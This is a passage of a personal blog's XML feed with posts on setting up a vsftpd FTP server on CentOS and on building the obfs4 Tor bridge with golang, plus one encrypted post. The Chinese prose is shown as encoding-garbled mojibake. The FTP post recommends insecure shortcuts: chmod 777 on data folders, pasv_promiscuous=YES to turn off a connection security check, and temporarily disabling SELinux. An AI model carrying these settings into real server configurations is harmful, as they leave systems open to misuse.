class="number">44550</span>#æŒ‡å®šè¢«åŠ¨æ¨¡å¼æœ€å°ç«¯å£</span><br><span class="line">pasv_max_port=<span class="number">44551</span>#æŒ‡å®šè¢«åŠ¨æ¨¡å¼æœ€å¤§ç«¯å£</span><br><span class="line">pasv_promiscuous=YES #å…³é—­è¢«åŠ¨æ¨¡å¼çš„å®‰å…¨æ£€æŸ¥(è¿™ä¸ªæ£€æŸ¥å¯ä»¥ç¡®ä¿æ•°æ®è¿æ¥æºäºåŒä¸€IPåœ°å€)</span><br></pre></td></tr></table></figure><p>é‡å¯<code>vsftpd</code>æœåŠ¡</p><p>æ”¯æŒäº†è¢«åŠ¨æ¨¡å¼ï¼Œå¹¶ä¸”æŒ‡å®šäº†ç«¯å£å¼€æ”¾èŒƒå›´ï¼Œé‚£ä¹ˆæˆ‘ä»¬åœ¨é˜²ç«å¢™è¿›è¡Œç«¯å£çš„é…ç½®å³å¯ã€‚</p><p>é‡å¯é˜²ç«å¢™ï¼Œç„¶åå†æ¬¡æµ‹è¯•ï¼š<br><img src="http://ggb0n.cool/images/ftp3.png" alt=""></p><p>å¯ä»¥çœ‹åˆ°ç›®å½•æˆåŠŸåˆ—ä¸¾äº†ï¼Œé—®é¢˜å¾—åˆ°è§£å†³ã€‚</p><h4 id="ä¸Šä¼ æ–‡ä»¶å¤±è´¥çš„é—®é¢˜"><a href="#ä¸Šä¼ æ–‡ä»¶å¤±è´¥çš„é—®é¢˜" class="headerlink" title="ä¸Šä¼ æ–‡ä»¶å¤±è´¥çš„é—®é¢˜"></a>ä¸Šä¼ æ–‡ä»¶å¤±è´¥çš„é—®é¢˜</h4><p>å½“èƒ½æˆåŠŸç™»å½•ã€æˆåŠŸåˆ—ä¸¾ç›®å½•äº†ä¹‹åï¼Œæœ€ä¸»è¦çš„ç›®çš„å½“ç„¶æ˜¯æ–‡ä»¶çš„ä¸Šä¼ å’Œä¸‹è½½äº†ï¼Œç„¶åå½“å»æµ‹è¯•çš„æ—¶å€™ï¼Œåˆå‡ºç°äº†é—®é¢˜ï¼š<br><img src="http://ggb0n.cool/images/ftp4.png" alt=""></p><p>æŠ¥é”™ï¼š<code>553 Could not create file.</code></p><p>æœ¬æ¥æƒ³ç€å¾ˆç®€å•ï¼Œåº”è¯¥æ˜¯æ–‡ä»¶å¤¹æƒé™çš„é—®é¢˜ï¼Œä½†æ˜¯å¯¹æ–‡ä»¶å¤¹æ”¹äº†777ï¼Œç”šè‡³<code>/data</code>éƒ½æ”¹æˆ777äº†è¿˜æ˜¯ä¸è¡Œï¼Œåæ¥æŸ¥èµ„æ–™ï¼Œç½‘ä¸Šè¯´å¯èƒ½æ˜¯<code>SELinux</code>çš„é—®é¢˜ï¼Œè¿™æ˜¯ä¸ªä»€ä¹ˆå‘¢ï¼Ÿ</p><blockquote><p>SELinux(Security-Enhanced Linux) æ˜¯ç¾å›½å›½å®¶å®‰å…¨å±€ï¼ˆNSAï¼‰å¯¹äºå¼ºåˆ¶è®¿é—®æ§åˆ¶çš„å®ç°ï¼Œæ˜¯ Linuxå†å²ä¸Šæœ€æ°å‡ºçš„æ–°å®‰å…¨å­ç³»ç»Ÿã€‚NSAæ˜¯åœ¨Linuxç¤¾åŒºçš„å¸®åŠ©ä¸‹å¼€å‘äº†ä¸€ç§è®¿é—®æ§åˆ¶ä½“ç³»ï¼Œåœ¨è¿™ç§è®¿é—®æ§åˆ¶ä½“ç³»çš„é™åˆ¶ä¸‹ï¼Œè¿›ç¨‹åªèƒ½è®¿é—®é‚£äº›åœ¨ä»–çš„ä»»åŠ¡ä¸­æ‰€éœ€è¦æ–‡ä»¶ã€‚ â€“ç™¾ç§‘</p><p>SELinux ä¸»è¦ä½œç”¨å°±æ˜¯<strong>æœ€å¤§é™åº¦åœ°å‡å°ç³»ç»Ÿä¸­æœåŠ¡è¿›ç¨‹å¯è®¿é—®çš„èµ„æº</strong>ï¼ˆæœ€å°æƒé™åŸåˆ™ï¼‰ã€‚</p><p>è¿™é‡Œæœ‰ä¸€ç¯‡ä¸é”™çš„<a href="https://zhuanlan.zhihu.com/p/30483108">æ–‡ç« </a>å¯ä»¥å‚è€ƒã€‚</p></blockquote><p>é‚£ä¹ˆæˆ‘ä»¬å…³é—­SELinuxè¯•è¯•ï¼š<code>setenforce 0</code>ï¼Œç„¶åæµ‹è¯•ä¸€ä¸‹çœ‹çœ‹ï¼š<br><img src="http://ggb0n.cool/images/ftp5.png" alt=""></p><p>æœç„¶æˆäº†ï¼Œé‚£å°±æ˜¯å®ƒçš„é—®é¢˜äº†ï¼Œä¸‹é¢å°±å¯¹å…¶è¿›è¡Œé…ç½®<br>å…ˆçœ‹ä¸€ä¸‹æƒé™ï¼š<code>getsebool -a | grep ftpd</code></p><figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ç½‘ä¸Šæ˜¯è¿™æ ·çš„</span></span><br><span class="line">allow_ftpd_anon_write --&gt; off</span><br><span class="line">allow_ftpd_full_access --&gt; off</span><br><span class="line">allow_ftpd_use_cifs --&gt; off</span><br><span class="line">allow_ftpd_use_nfs --&gt; off</span><br><span class="line">ftpd_connect_db --&gt; off</span><br><span class="line">ftpd_use_passive_mode --&gt; off</span><br><span class="line">ftp_home_dir --&gt; off</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä½†æ˜¯æˆ‘çš„æœåŠ¡å™¨æ˜¯è¿™æ ·çš„</span></span><br><span class="line">ftpd_anon_write --&gt; off</span><br><span class="line">ftpd_connect_all_unreserved --&gt; off</span><br><span class="line">ftpd_connect_db --&gt; off</span><br><span class="line">ftpd_full_access --&gt; off</span><br><span class="line">ftpd_use_cifs --&gt; off</span><br><span class="line">ftpd_use_fusefs --&gt; off</span><br><span class="line">ftpd_use_nfs --&gt; off</span><br><span class="line">ftpd_use_passive_mode --&gt; off</span><br></pre></td></tr></table></figure><p>ç³»ç»Ÿä¹‹é—´çš„å·®å¼‚ï¼Œæ²¡åŠæ³•ï¼Œä½†æ˜¯è§£å†³æ–¹å¼æ˜¯ä¸€æ ·çš„ï¼Œå‘½ä»¤è¡Œæ‰§è¡Œä¸‹é¢ä¸¤æ¡å‘½ä»¤ï¼š</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">setsebool -P ftp_home_dir <span class="number">1</span> #è¿™ä¸€æ¡å‘½ä»¤æˆ‘çš„æœåŠ¡å™¨ä¸Šæ²¡æ‰§è¡ŒæˆåŠŸ</span><br><span class="line">setsebool -P allow_ftpd_full_access <span class="number">1</span></span><br></pre></td></tr></table></figure><p>ç„¶åå†å¼€å¯SELinuxï¼š<code>setenforce 1</code></p><p>å†æ¬¡è¿›è¡Œæµ‹è¯•ï¼š<br><img src="http://ggb0n.cool/images/ftp6.png" alt=""></p><p>å¯ä»¥çœ‹åˆ°ï¼ŒæˆåŠŸä¸Šä¼ æ–‡ä»¶ï¼Œé—®é¢˜è§£å†³ã€‚</p><h4 id="ä¸‹è½½æ–‡ä»¶å¤±è´¥çš„é—®é¢˜"><a href="#ä¸‹è½½æ–‡ä»¶å¤±è´¥çš„é—®é¢˜" class="headerlink" title="ä¸‹è½½æ–‡ä»¶å¤±è´¥çš„é—®é¢˜"></a>ä¸‹è½½æ–‡ä»¶å¤±è´¥çš„é—®é¢˜</h4><p>å°è¯•ä»æœåŠ¡å™¨ä¸Šä¸‹è½½æ–‡ä»¶æ—¶ï¼Œåˆerroräº†â€¦<br><img src="http://ggb0n.cool/images/ftp1.png" alt=""></p><p>å¯ä»¥çœ‹åˆ°ï¼Œä¸‹è½½æ–‡ä»¶æ—¶æŠ¥é”™ï¼š<code>550 Failed to open file.</code><br>è¿™æ¬¡é—®é¢˜å…¶å®ä¸å¤æ‚ï¼Œå¾ˆå®¹æ˜“æƒ³åˆ°æ˜¯æ–‡ä»¶æƒé™çš„é—®é¢˜ï¼Œçœ‹ä¸€ä¸‹ï¼š<br><img src="http://ggb0n.cool/images/ftp7.png" alt=""><br>å¯ä»¥çœ‹åˆ°<code>test.cap</code>æ–‡ä»¶æ˜¯å±äº<code>root</code>ç”¨æˆ·ç»„çš„ï¼Œå¹¶ä¸”æƒé™å¾ˆå°ï¼Œä½ ä¸€ä¸ª<code>ftpuser</code>ç”¨æˆ·å»æ“ä½œå®ƒè‚¯å®šæ²¡æƒé™ï¼Œé‚£ç®€å•ï¼Œæ”¹ä¸€ä¸‹ä¸å°±å¥½äº†ï¼š<code>chmod -R 777 test.cap</code>ï¼Œå†è¯•è¯•ï¼š<br><img src="http://ggb0n.cool/images/ftp8.png" alt=""></p><p>è¯è¯´å›æ¥ï¼Œå¦‚æœæ²¡æœ‰ç‰¹æ®Šéœ€è¦ï¼Œè¿˜æ˜¯ç”¨<code>lrzsz</code>æ–¹ä¾¿â€¦<br>æœ€åï¼Œå¸Œæœ›è¿™ç¯‡æ–‡ç« èƒ½å¤Ÿå¸®åŠ©åˆ°ä½ ã€‚</p><p>å‚è€ƒï¼š<br><a href="https://blog.csdn.net/zyw_java/article/details/75212608">åŸºäºCentOSæ­å»ºFTPæ–‡ä»¶æœåŠ¡</a><br><a href="https://blog.csdn.net/kxwinxp/article/details/78595044">CentOS7å®‰è£…FTPæœåŠ¡å™¨</a><br><a href="https://blog.csdn.net/anzhen0429/article/details/75151173">553 Could not create fileé—®é¢˜çš„è§£å†³</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;SSHç®¡ç†è¿œç¨‹LinuxæœåŠ¡å™¨å°‘ä¸äº†æ–‡ä»¶çš„ä¼ è¾“ï¼Œè™½ç„¶&lt;code&gt;lrzsz&lt;/code&gt;èƒ½å¤Ÿè§£å†³æœ¬åœ°ä¸è¿œç¨‹æœåŠ¡å™¨ä¹‹é—´æ–‡ä»¶ä¼ è¾“çš„é—®é¢˜ï¼Œä½¿ç”¨&lt;code&gt;sz/rz&lt;/code&gt;å³å¯ï¼Œæ¯”å¦‚ï¼š
    
    </summary>
    
    
      <category term="çæ‰æ‘¸çš„ä¸€äº›å­¦ä¹ " scheme="http://ggb0n.cool/categories/%E7%9E%8E%E6%8D%89%E6%91%B8%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="FTPæœåŠ¡å™¨æ­å»º" scheme="http://ggb0n.cool/categories/%E7%9E%8E%E6%8D%89%E6%91%B8%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AD%A6%E4%B9%A0/FTP%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA/"/>
    
    
      <category term="Linux" scheme="http://ggb0n.cool/tags/Linux/"/>
    
      <category term="FTP" scheme="http://ggb0n.cool/tags/FTP/"/>
    
  </entry>
  
  <entry>
    <title>golangç¼–è¯‘é¡¹ç›®çš„ä¸€ä¸ªå·¨å‘</title>
    <link href="http://ggb0n.cool/2020/04/01/golang%E7%BC%96%E8%AF%91%E9%A1%B9%E7%9B%AE%E7%9A%84%E4%B8%80%E4%B8%AA%E5%B7%A8%E5%9D%91/"/>
    <id>http://ggb0n.cool/2020/04/01/golang%E7%BC%96%E8%AF%91%E9%A1%B9%E7%9B%AE%E7%9A%84%E4%B8%80%E4%B8%AA%E5%B7%A8%E5%9D%91/</id>
    <published>2020-04-01T02:07:31.000Z</published>
    <updated>2020-04-22T00:14:14.929Z</updated>
    
    <content type="html"><![CDATA[<p>æœ€è¿‘åœ¨å­¦ä¸€äº›æ–°ä¸œè¥¿ï¼Œæ¶‰åŠåˆ°äº†æ­<code>obfs4</code>ç½‘æ¡¥ï¼Œç”±äºå®˜æ–¹æä¾›çš„ç½‘æ¡¥<a href="https://github.com/Yawning/obfs4">é¡¹ç›®</a>æ˜¯goè¯­è¨€ç¼–å†™çš„ï¼Œä¹‹å‰åˆæ²¡å­¦è¿‡ã€ä¹Ÿæ²¡æ­è¿‡ç›¸å…³ç¯å¢ƒï¼Œå¯ä»¥è¯´åŸºæœ¬æ˜¯ä»é›¶æèµ·ï¼Œå…¶ä¸­é‡åˆ°çš„é—®é¢˜â€¦ç®—äº†ï¼Œä¸‹é¢è¿™ä¸ªé—®é¢˜å¿…é¡»è®°å½•ï¼Œç½‘ä¸Šéƒ½æ²¡æ‰¾åˆ°è§£å†³æ–¹æ¡ˆï¼Œä¸€å®šè¦è®°å½•ä¸€ä¸‹ã€‚<a id="more"></a></p><h3 id="æœ€åˆçš„ç¯å¢ƒæ­å»º"><a href="#æœ€åˆçš„ç¯å¢ƒæ­å»º" class="headerlink" title="æœ€åˆçš„ç¯å¢ƒæ­å»º"></a>æœ€åˆçš„ç¯å¢ƒæ­å»º</h3><p>ç”±äºgolangç¼–å†™çš„é¡¹ç›®ä¼šåˆ©ç”¨gitå»å¯»æ‰¾ä¾èµ–åº“ï¼Œå› æ­¤é¦–å…ˆå°±éœ€è¦é…ç½®gitç¯å¢ƒï¼Œç”±äºä¹‹å‰çŸ¥é“äº†æ—§ç‰ˆçš„gitå¯èƒ½ä¼šå¯¼è‡´ä¸€äº›é—®é¢˜ï¼Œäºæ˜¯å°±æ‰‹åŠ¨å®‰è£…äº†æ–°ç‰ˆçš„gitã€‚</p><h4 id="é…ç½®gitç¯å¢ƒ"><a href="#é…ç½®gitç¯å¢ƒ" class="headerlink" title="é…ç½®gitç¯å¢ƒ"></a>é…ç½®gitç¯å¢ƒ</h4><p>æœºå™¨ä¸Šå¯èƒ½å·²ç»å­˜åœ¨gitï¼Œå¯ä»¥é€šè¿‡å¦‚ä¸‹å‘½ä»¤æŸ¥çœ‹ç‰ˆæœ¬ä¿¡æ¯ï¼š</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git version</span><br></pre></td></tr></table></figure><p>å¦‚æœç‰ˆæœ¬è¾ƒä½ï¼Œæœ€å¥½å°±æ‰‹åŠ¨æ›´æ–°ä¸€ä¸‹ã€‚</p><p>é¦–å…ˆç§»é™¤æ—§ç‰ˆæœ¬çš„gitï¼š</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yum remove git</span><br></pre></td></tr></table></figure><p>ç„¶åå®‰è£…æœ€æ–°ç‰ˆçš„gitï¼Œå½“ç„¶æœ€å¥½å…ˆè£…ä¸€ä¸‹ä¾èµ–åº“ï¼š</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yum install curl-devel expat-devel gettext-devel openssl-devel zlib-devel asciidoc</span><br><span class="line">yum install  gcc perl-ExtUtils-MakeMaker</span><br></pre></td></tr></table></figure><p>ä¾èµ–åº“è£…å¥½ä¹‹åï¼Œå°±å¯ä»¥å®‰è£…ã€ç¼–è¯‘æœ€æ–°ç‰ˆçš„gitäº†ï¼š</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@guest ~]# cd &#x2F;usr&#x2F;local&#x2F;src&#x2F;</span><br><span class="line">[root@guest src]# wget https:&#x2F;&#x2F;www.kernel.org&#x2F;pub&#x2F;software&#x2F;scm&#x2F;git&#x2F;git-2.26.0.tar.xz</span><br><span class="line">[root@guest src]# tar -vxf git-2.26.0.tar.xz</span><br><span class="line">[root@guest src]# cd git-2.26.0</span><br><span class="line">[root@guest git-2.26.0]# make prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;git all</span><br><span class="line">[root@guest git-2.26.0]# make prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;git install</span><br><span class="line">[root@guest git-2.26.0]# echo &quot;export PATH&#x3D;$PATH:&#x2F;usr&#x2F;local&#x2F;git&#x2F;bin&quot; &gt;&gt; &#x2F;etc&#x2F;profile</span><br><span class="line">[root@guest git-2.26.0]# source &#x2F;etc&#x2F;profile</span><br></pre></td></tr></table></figure><p>è‡³æ­¤ï¼Œæœ€æ–°ç‰ˆgité…ç½®å®Œæ¯•ï¼Œå¯ä»¥æŸ¥çœ‹å…¶ç‰ˆæœ¬ä¿¡æ¯ï¼š</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@guest git-2.26.0]# git version</span><br><span class="line">git version 2.26.0</span><br></pre></td></tr></table></figure><h4 id="é…ç½®golangç¯å¢ƒ"><a href="#é…ç½®golangç¯å¢ƒ" class="headerlink" title="é…ç½®golangç¯å¢ƒ"></a>é…ç½®golangç¯å¢ƒ</h4><p>golangçš„ç¯å¢ƒæ˜¯å‚è€ƒç½‘ä¸Šçš„åšå®¢è£…çš„ï¼Œå…¶å®å°±æ˜¯åˆ©ç”¨yumå®‰è£…ï¼š</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@guest ~]# yum -y install golang</span><br></pre></td></tr></table></figure><p>æœ€åˆè£…å®Œä¹‹åä¹Ÿå°±æ²¡æœ‰ç®¡gitçš„ç‰ˆæœ¬äº†ï¼Œç›´æ¥æŠŠ<code>obfs4</code>çš„é¡¹ç›®æ”¾åœ¨äº†<code>go/src</code>ä¸‹è¿›è¡Œç¼–è¯‘äº†ã€‚</p><h4 id="æŠ¥é”™ä¿¡æ¯"><a href="#æŠ¥é”™ä¿¡æ¯" class="headerlink" title="æŠ¥é”™ä¿¡æ¯"></a>æŠ¥é”™ä¿¡æ¯</h4><p>åˆ©ç”¨ä¸Šé¢çš„æ–¹æ³•æ­å»ºçš„ç¯å¢ƒç›´æ¥å»ç¼–è¯‘é¡¹ç›®ï¼Œç»“æœä¸€ç›´æŠ¥é”™ï¼š</p><p><img src="http://ggb0n.cool/images/golang1.png" alt=""></p><p>ä¸ç®¡æ˜¯æ”¹é¡¹ç›®ç›®å½•ã€æ¢æ–¹å¼ç¼–è¯‘ï¼Œä¸€ç›´éƒ½æ˜¯æ‰¾ä¸åˆ°ä¾èµ–åº“çš„é”™è¯¯ï¼Œç”šè‡³æƒ³åˆ°äº†ä¼šä¸ä¼šæ˜¯ä½œè€…çš„é¡¹ç›®æœ‰é—®é¢˜ã€è¿˜ç»™ä½œè€…å‘äº†å°é‚®ä»¶â€¦è¯·é¡¹ç›®ä½œè€…ä¸è¦æ‰“æˆ‘å•Šâ€¦</p><p>ç»“æœä¸¤å¤©éƒ½æ²¡æå®šâ€¦éƒ½è¦å¿ƒç°æ„å†·äº†â€¦</p><p>å¶ç„¶ä¹‹é—´ï¼Œæˆ‘å‘ç°å¸è½½<code>golang</code>çš„æ—¶å€™æç¤ºä¼šåŒæ—¶å¸è½½<code>git</code>ï¼Œå—¯ï¼Ÿï¼Ÿï¼Ÿï¼ï¼ï¼<br>è¿™ä¸ªgitè¿˜æ˜¯1.8ç‰ˆæœ¬çš„ï¼Œå—¯ï¼Ÿï¼Ÿï¼Ÿï¼ï¼ï¼</p><p>äºæ˜¯å°±å®éªŒäº†ä¸€ä¸‹ï¼Œæˆ‘é‡æ–°ç”¨yumè£…golangç»“æœç¡®å®æç¤ºä¼šåŒæ—¶è£…<code>git-1.8.1</code>ï¼Œè£…ä¸Šä¹‹ååˆçœ‹äº†ä¸€ä¸‹gitç‰ˆæœ¬ï¼Œ<code>1.8.1</code>ï¼Œwocâ€¦é—®é¢˜ä¸ä¼šåœ¨è¿™å§â€¦å®è·µè¯å®ï¼Œé—®é¢˜å°±åœ¨è¿™ã€‚</p><h3 id="è§£å†³é—®é¢˜"><a href="#è§£å†³é—®é¢˜" class="headerlink" title="è§£å†³é—®é¢˜"></a>è§£å†³é—®é¢˜</h3><p>é¦–å…ˆæŠŠå½“å‰çš„golangç›´æ¥<code>yum remove</code>æ‰ï¼Œæœ€å¥½æ¸…çš„å¹²å‡€ä¸€äº›ï¼š</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rm -rf &#x2F;usr&#x2F;local&#x2F;go</span><br></pre></td></tr></table></figure><p>gitæœ€æ–°ç‰ˆçš„é…ç½®å°±ä¸è¯´äº†ï¼Œä¸Šé¢å·²ç»è®²åˆ°äº†ï¼Œè¯´ä¸€ä¸‹æœ€æ–°ç‰ˆgolangçš„å®‰è£…é…ç½®ã€‚</p><p>åˆ°<a href="https://golang.org/">å®˜ç½‘</a>ä¸‹è½½æœ€æ–°ç‰ˆçš„å‹ç¼©åŒ…ï¼Œæ‹–åˆ°vpsé‡Œï¼Œå½“ç„¶ä¹Ÿå¯ä»¥ç›´æ¥<code>wget</code>ï¼Œä¹‹åè¿›è¡Œè§£å‹ï¼š</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tar -zxf go1.x.x.linux-amd64.tar.gz -C &#x2F;usr&#x2F;local</span><br></pre></td></tr></table></figure><p>ç„¶åé…ç½®ç¯å¢ƒå˜é‡ï¼š</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vi &#x2F;etc&#x2F;profile</span><br></pre></td></tr></table></figure><p>åœ¨<code>profile</code>æœ«å°¾æ·»åŠ å¦‚ä¸‹å†…å®¹ï¼š</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#golang env config</span><br><span class="line">export GO111MODULE&#x3D;on</span><br><span class="line">export GOROOT&#x3D;&#x2F;usr&#x2F;local&#x2F;go </span><br><span class="line">export GOPATH&#x3D;&#x2F;home&#x2F;gopath</span><br><span class="line">export PATH&#x3D;$PATH:$GOROOT&#x2F;bin:$GOPATH&#x2F;bin</span><br></pre></td></tr></table></figure><blockquote><p>è¿™é‡Œçš„GO111MODULEé…ç½®æ˜¯go1.11åå‡ºçš„ä¸€ç§æ–°çš„åŒ…ç®¡ç†go modulesæ–¹å¼ä»£æ›¿vendoræœºåˆ¶ï¼Œå¯ä»¥ä¸éœ€è¦GOPATHï¼Œé¡¹ç›®ä»£ç ä¹Ÿä¸ä¸€å®šè¦æ”¾åœ¨GOPATHä¸‹é¢ã€‚</p><ul><li>GO111MODULE=auto è‡ªåŠ¨</li><li>GO111MODULE=on ä½¿ç”¨go modulesï¼Œä¸ä¼šåœ¨vendorå’Œgopathæ‰¾ä¾èµ–</li><li>GO111MODULE=off ä½¿ç”¨vendor æˆ–è€…gotpath</li></ul></blockquote><p>ç„¶ååˆ°<code>/home</code>ä¸‹æ–°å»º<code>gopath</code>æ–‡ä»¶å¤¹ï¼Œæ–°å»ºä¹‹åå³å¯ä½¿é…ç½®ç”Ÿæ•ˆï¼š</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">source &#x2F;etc&#x2F;profile</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹golangç‰ˆæœ¬<code>go version</code>å·²ç»æ˜¯æœ€æ–°ç‰ˆã€‚</p><h4 id="æµ‹è¯•"><a href="#æµ‹è¯•" class="headerlink" title="æµ‹è¯•"></a>æµ‹è¯•</h4><p>å°†obfs4çš„é¡¹ç›®æ”¾åˆ°<code>/home/gopath</code>ä¹‹ä¸‹ï¼Œå†æ¬¡è¿›è¡Œç¼–è¯‘ï¼š</p><p><img src="http://ggb0n.cool/images/golang2.png" alt=""></p><p>å¯ä»¥çœ‹åˆ°ï¼Œå·²ç»å¯ä»¥æˆåŠŸç¼–è¯‘ã€‚</p><p>é—®é¢˜è§£å†³ï¼Œæ•£èŠ±ï¼Œä¸çŸ¥é“è¿™æ˜¯ä¸æ˜¯å…¨ç½‘ç¬¬ä¸€ä¸ªè§£å†³è¿™ä¸ªé—®é¢˜çš„æ–‡ç« ï¼Œä¸è¿‡è¿˜æ˜¯æƒ¬æ„ä¸€ä¸‹ã€‚</p><p>å‚è€ƒï¼š<br><a href="https://www.cnblogs.com/kevingrace/p/8252517.html">gitæœ€æ–°ç‰ˆé…ç½®</a><br><a href="https://www.cnblogs.com/nickchou/p/10934025.html">golangæœ€æ–°ç‰ˆé…ç½®</a><br><a href="https://github.com/Yawning/obfs4">obfs4ç½‘æ¡¥é…ç½®</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;æœ€è¿‘åœ¨å­¦ä¸€äº›æ–°ä¸œè¥¿ï¼Œæ¶‰åŠåˆ°äº†æ­&lt;code&gt;obfs4&lt;/code&gt;ç½‘æ¡¥ï¼Œç”±äºå®˜æ–¹æä¾›çš„ç½‘æ¡¥&lt;a href=&quot;https://github.com/Yawning/obfs4&quot;&gt;é¡¹ç›®&lt;/a&gt;æ˜¯goè¯­è¨€ç¼–å†™çš„ï¼Œä¹‹å‰åˆæ²¡å­¦è¿‡ã€ä¹Ÿæ²¡æ­è¿‡ç›¸å…³ç¯å¢ƒï¼Œå¯ä»¥è¯´åŸºæœ¬æ˜¯ä»é›¶æèµ·ï¼Œå…¶ä¸­é‡åˆ°çš„é—®é¢˜â€¦ç®—äº†ï¼Œä¸‹é¢è¿™ä¸ªé—®é¢˜å¿…é¡»è®°å½•ï¼Œç½‘ä¸Šéƒ½æ²¡æ‰¾åˆ°è§£å†³æ–¹æ¡ˆï¼Œä¸€å®šè¦è®°å½•ä¸€ä¸‹ã€‚
    
    </summary>
    
    
      <category term="çæ‰æ‘¸çš„ä¸€äº›å­¦ä¹ " scheme="http://ggb0n.cool/categories/%E7%9E%8E%E6%8D%89%E6%91%B8%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="obfs4ç½‘æ¡¥æ­å»º" scheme="http://ggb0n.cool/categories/%E7%9E%8E%E6%8D%89%E6%91%B8%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AD%A6%E4%B9%A0/obfs4%E7%BD%91%E6%A1%A5%E6%90%AD%E5%BB%BA/"/>
    
    
      <category term="Linux" scheme="http://ggb0n.cool/tags/Linux/"/>
    
      <category term="golang" scheme="http://ggb0n.cool/tags/golang/"/>
    
      <category term="git" scheme="http://ggb0n.cool/tags/git/"/>
    
      <category term="Tor" scheme="http://ggb0n.cool/tags/Tor/"/>
    
      <category term="obfs4ç½‘æ¡¥" scheme="http://ggb0n.cool/tags/obfs4%E7%BD%91%E6%A1%A5/"/>
    
  </entry>
  
  <entry>
    <title>è®°å½•ä¸€æ¬¡ç½‘ç»œé…ç½®</title>
    <link href="http://ggb0n.cool/2020/03/28/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/"/>
    <id>http://ggb0n.cool/2020/03/28/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/</id>
    <published>2020-03-28T03:41:06.000Z</published>
    <updated>2020-04-22T00:38:53.889Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="ä¸å¥½æ„æ€ï¼Œå¯†ç æ²¡å¯¹å“¦ï¼Œåœ¨æ£€æŸ¥æ£€æŸ¥å‘¢ï¼" data-whm="ä¸å¥½æ„æ€ï¼Œä¿¡æ¯æ— æ³•éªŒè¯">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">å—¨ï¼Œè¯·å‡†ç¡®æ— è¯¯åœ°è¾“å…¥å¯†ç æŸ¥çœ‹å“Ÿï¼</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="94c8feb45044bada49f9250db34616198461102ecb14dd347b867e1f041ec5af">1fbf72b2372de9b3a01247e55a1bbafbc6aa0bf5d7d642bd430b7cb1c8268a3dfcc1a58cd930bfb402ef37ae414a51dfbf30fe23db46b80fbf3d668d8dd9fca9ed158481a725cc6d1384e999b84465260467cfe5e99cbabaaad7213dce90123c282d5d07668851261b09dc74eec002f037bb2ff47c7365bf92cd288b26fd64f90df38d76d8682eae110e421e5e956c4982d0f202be6b84eb749aebb2656217f445909e984eb98ecdd692cfad9563726600bebd537e2df533a13737f976f854886994072c8dc1e5e83b87bf3aeea8a0e7b76434edbbc0599f03d85f5c3c1b99083fc4e428d1ce5809ed4efec011548f24d7fec7f60789626ee66e22e695c7aa4cb7344f30d89a20e3cad575fed5ccc60b8df0c99c1d9c647767e0bb40a8e9453ad3078466db54daadd0da0607037e9191e2b69ffd7b03b7b903e7e234b8ebef1631697b652714503eba6e40fa55388aea78d1e239f834bc1d75f051d29f2365ba353822ecb581e332c0bdd93a1141da39d14eafcf964e1f5ce81e1786861975b80c4edd166d200b359695fe75be745b6b1648a0483345c9336539351fb4ec7f5f010411ca5f9ec87ff3e15682763bedb70dd06d39ff4499fa1082cd85bb64b31625d8a3ce1ae36e828d52755535a32f068c0506366d92db9d60ddbde0f9aa21f29ee7f71e8140e8bf73ad66e550f841d2600183c60e8a9b01970231faa4f3ed13baa45cc1ce4880f58bf98748de89c12c353b1341f531254fdeb3dea2071bc687d38a9fe78d4c7d2afbbdde06596ee29fd3ca20f3f9dfb56f0284b44a2c9d508343548db99ff8de8a81a4d62e45cdffe5b4dab25edee884ee145973c88c74c0b522b657800cd1c335165589cc3fa946f5265c77b962fcf654087ee7dabfaa6fd14ddc99eb71648708be90771b44c57d5bf57df2897b52504032f95c00763b192fba3822c6934cd19c969e29cf91dda439577d3f69e40431b7f874cfc51b6d2b7201f646c96637c2ef176a0a19a0f47d2f93a3c3117c37295db712c5d5a87d9b3fef208269ec0d1e0660783930377e044ce1ef6e521a76d865b35cf1d4f5dd6e7804a93950da0a403a687ef52b9ecda62b2b4aae6288664799b19826ef51206b57c1bfaa3675a031de0c1429cf4db66ed671d934ebad980c54b8f04c97d17d056dad2f9feb68fee7ad1729ea8be41766a8e420351de08ed4da551b4fbed6975a51f97e6dc25e2da16fb43098c82d4976f18d3229731535eb2983cadb18df883aefbd1c3847bec45b69c22106e660fd096de6345cabe96cc2c893711221bf63e0253a9b113c4f376a81b119c26a204789b492232e282d8d7ca01411cb41e2777116515587925e82ff7fc2fa9057876c4073e76fa30883b7b745f8a432ad8dd65142cbdd17d587cdb2eca228d03c1423afc08ed0cffde9c5888f247306073044ef22a2f2f751a8d23c94d90fe1ae49dd6798ada31c0d7141f76bcf9a6c0d34da7dedaba0e2020b79e8e8307cb82581ae81908e8fddd167e6964f8b819bbe3b72ef4d2876960f07a